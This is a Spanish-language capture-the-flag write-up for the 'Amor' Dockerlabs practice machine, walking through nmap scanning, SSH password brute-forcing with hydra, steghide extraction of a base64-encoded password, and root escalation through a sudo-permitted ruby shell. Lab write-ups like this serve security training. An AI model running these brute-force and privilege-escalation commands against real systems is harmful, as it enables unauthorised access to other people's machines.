# Máquina Amor

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> [romabri](https://github.com/romabri/WriteUps/commits?author=romabri)

---

## Reconocimiento



Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.
```shell
❯ ping -c 1 172.17.0.2 -R
PING 172.17.0.2 (172.17.0.2) 56(124) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.074 ms
RR: 	172.17.0.1
	172.17.0.2
	172.17.0.2
	172.17.0.1


--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.074/0.074/0.074/0.000 ms
```

Ya con esto podemos observar que el ttl=64 corresponde a una maquina Linux 

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.
```shell
❯ nmap -sCV -p- --open --min-rate 5000 -n 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 19:09 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: SecurSEC S.L
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
También pueden utilizar el -vvv para ver en tiempo real la información durante el escaneo ,
Podemos observar que tiene el puerto 22 abierto es decir podemos acceder con credenciales SSH además del puerto 80, por lo tanto eso nos hace sospechar que debe tener una pagina levantada. 

Accedemos a la web para inspeccionarla, donde encontramos información importante como un par de usuarios, **carlota** y **juan**. Y que hay usuarios en el sistema con contraseñas débiles.

---

## Explotación


Aplicamos fuerza bruta con **hydra** sobre los usuarios:
```shell
❯ hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-24 11:52:37
```

Encontramos las credenciales de carlota -> **carlota:babygirl** Accedemos por ssh:

Estamos dentro !

---

## Escalada de privilegios


En el directorio **/home/Desktop/fotos/vacaciones** de Carlota encontramos una imagen.

Nos la descargaremos para verla. Podemos usar **scp**:
```shell
❯ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
```

Veremos si tiene algo oculto con la herramienta **steghide**:
```shell
steghide --extract -sf imagen.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"secret.txt".
```
Obtenemos un **secret.txt** con la siguiente información -> **ZXNsYWNhc2FkZXBpbnlwb24=**

utilizamos  **base64** así que lo decodificamos:
```shell
base64 -d secret.txt
eslacasadepinypon#  
```

Usaremos esta información como contraseña para intentar migrar a otro usuario o convertirnos en **root**:

```shell
su oscar
```

Conseguimos migrar al usuario **oscar**. Ejecutamos **sudo -l** para ver si podemos ejecutar algo como otro usuario o como **root**:

```shell
sudo -l
------------------------------------------------
User oscar may run the following commands on 6ba86e9dc48a:
    (ALL) NOPASSWD: /usr/bin/ruby
```

Podemos ejecutar **ruby** como el usuario **root**, si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/)

```shell
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

```shell
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo en la máquina.

```shell
cat /root/Desktop/THX.txt
-------------------------------
Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.
```